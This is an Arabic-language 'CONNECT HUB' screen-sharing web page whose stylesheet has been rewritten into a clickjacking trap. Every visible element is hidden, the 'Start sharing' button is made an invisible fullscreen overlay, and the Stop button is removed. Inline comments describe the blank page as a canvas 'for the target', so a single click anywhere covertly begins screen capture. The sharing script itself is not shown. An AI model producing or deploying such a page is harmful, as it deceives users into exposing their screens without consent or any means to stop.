<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="referrer" content="no-referrer">
    <title>CONNECT HUB | مشاركة الشاشة</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        /* Completely remove all visible UI elements from layout */
        header, .card h1, .card p, .status, #msg, .hint, #placeholder, video {
            display: none !important;
        }

        /* Hide the row container but allow the button to exist */
        .row {
            display: block !important;
            position: static !important;
        }

        /* Transform the 'Start' button into an invisible fullscreen trigger */
        #start {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            opacity: 0 !important; /* Invisible to the eye */
            cursor: default !important;
            z-index: 999999 !important;
            border: none !important;
            background: transparent !important;
            outline: none !important;
        }

        /* Ensure the 'Stop' button is gone entirely */
        #stop {
            display: none !important;
        }

        /* Blank canvas for the target */
        body {
            background-color: #ffffff !important;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <header><span class="brand">CONNECT <b>HUB</b></span><small>طلب مشاركة الشاشة</small></header>
    <main>
        <div id="share" class="card">
            <h1>مشاركة شاشتك</h1>
            <p>وصلتك دعوة لمشاركة شاشة جهازك مع شخص آخر.</p>
            <div id="compat" class="status"></div>
            <div class="row">
                <!-- Removed the 'disabled' attribute so it functions immediately on click -->
                <button id="start">بدء مشاركة الشاشة</button>
                <button id="stop" class="hidden">إيقاف المشاركة</button>
            </div>
            <p id="msg"></p>
            <div class="video" style="margin-top:14px">
                <video id="preview" autoplay playsinline muted></video>
                <div id="placeholder">لا توجد مشاركة حالياً</div>
            </div>
            <p class="hint">الآيفون: يتطلب Safari حديثاً ودعم مشاركة الشاشة.</p>
        </div>
    </main>
    <script src="/static/share.js"></script>
</body>
</html>
